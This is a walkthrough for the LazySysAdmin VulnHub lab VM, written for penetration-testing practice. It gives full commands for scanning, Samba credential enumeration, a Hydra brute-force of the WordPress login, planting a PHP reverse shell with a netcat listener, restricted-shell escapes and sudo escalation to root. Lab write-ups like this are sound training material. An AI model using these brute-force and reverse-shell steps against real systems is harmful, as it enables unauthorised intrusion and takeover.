# LazySysAdmin: 1 Walkthrough
[VulnHub link](https://www.vulnhub.com/entry/lazysysadmin-1,205/)  
By Togie Mcdogie

## **Prerequisites**
Before starting, ensure the following:

1. **LazySysAdmin VM**: Running on VMware or a similar hypervisor.
2. **Attacking Machine**: A penetration testing OS like Kali Linux.
3. **Knowledge**: Basic familiarity with Linux and penetration testing tools.

---

## **1. Network Configuration and Target Discovery**
Ensure both the LazySysAdmin VM and the attacking machine are on the same network. To discover the target's IP address, perform a network scan using `nmap`:

```bash
nmap 192.168.48.1/24
```

### **Sample Output:**
```plaintext
Nmap scan report for 192.168.48.170
Host is up (0.0031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:FD:CB:95 (VMware)
```

The target IP address is **192.168.48.170**, with SSH (port 22) and HTTP (port 80) open.

---

## **2. Bind Target IP to a Domain Name**
To simplify referencing the target, bind its IP address to a domain name in your `/etc/hosts` file:

```bash
sudo nano /etc/hosts
```

Add the following line:
```plaintext
192.168.48.170 lazysysadmin.com
```

Verify the changes:
```bash
cat /etc/hosts
```

### **Expected Output:**
```plaintext
127.0.0.1 localhost
192.168.48.170 lazysysadmin.com
```

---

## **3. Service Enumeration**
Perform a detailed scan to identify running services and their versions:

```bash
nmap -sV 192.168.48.170
```

### **Sample Output:**
```plaintext
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql   MySQL 5.7.12-0ubuntu1
6667/tcp open  irc     InspIRCd 2.0
```

The target is running several services, including **SSH**, **HTTP**, **Samba**, **MySQL**, and **IRC**.

---

## **4. Enumerating HTTP Services**
Visit the web application hosted on port 80 by navigating to:

```plaintext
http://lazysysadmin.com/
```

Analyze the site for potential vulnerabilities. Use **Gobuster** to enumerate directories:

```bash
gobuster dir -u http://lazysysadmin.com/ -w /usr/share/wordlists/dirb/common.txt
```

### **Sample Output:**
```plaintext
/info.php (Status: 200)
/phpmyadmin (Status: 301)
/wordpress (Status: 301)
```

The `phpmyadmin` and `wordpress` directories are potential targets for further investigation.

---

## **5. Gaining Access to MySQL Database**
Visit `http://lazysysadmin.com/phpmyadmin`. After attempting to log in, an error indicates that the connection to the MySQL server failed. This suggests further investigation is required.

Using **enum4linux** or **smbmap**, extract credentials from the Samba service running on port 139:

```bash
enum4linux 192.168.48.170
```

### **Sample Output:**
```plaintext
username: Admin
password: TogieMYSQL12345^^
```

Log in to phpMyAdmin with these credentials:

```plaintext
http://lazysysadmin.com/phpmyadmin
```

---

## **6. Exploring the WordPress Site**
Access the WordPress site at:

```plaintext
http://lazysysadmin.com/wordpress
```

Use **wpscan** to enumerate vulnerabilities and user accounts:

```bash
wpscan --url http://lazysysadmin.com/wordpress --enumerate u
```

### **Sample Output:**
```plaintext
[+] Enumerating Users...
[+] Found User: admin
```

Attempt to brute-force the password for `admin` using **Hydra** or **rockyou.txt**:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt lazysysadmin.com http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:Invalid password'
```

After retrieving the password, log in to WordPress to check for file upload vulnerabilities.

---

## **7. Gaining Reverse Shell**
Upload a PHP reverse shell to the WordPress theme editor (e.g., `comments.php`). Use the reverse shell located at `/usr/share/webshells/php/php-reverse-shell.php`:

1. Modify `$ip` and `$port` in the script to match your attacking machine.
2. Paste the script into the theme file.
3. Start a Netcat listener on your attacking machine:

```bash
nc -v -l -p 1234
```

4. Trigger the reverse shell by visiting the modified page.

After obtaining a shell, upgrade it to a fully interactive TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## **8. Privilege Escalation**
### Escaping a Restricted Shell
If the shell is restricted (e.g., `rbash`), use the following techniques:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Alternatively, use `vi`:

```plaintext
:set shell=/bin/sh
:shell
```

### Gaining Root Access
Run the following command to check for `sudo` privileges:

```bash
sudo -l
```

### **Sample Output:**
```plaintext
User togie may run the following commands on this host:
(root) ALL
```

Execute:

```bash
sudo su
```

You now have root access. Navigate to `/root` to retrieve the flag.

---

## **9. Concluding Remarks**
This walkthrough demonstrates enumeration, exploitation, and privilege escalation techniques on the LazySysAdmin VM. Always ensure you have explicit permission before testing any system.

For further practice, consider revisiting services like MySQL, Samba, and WordPress to explore additional attack vectors.

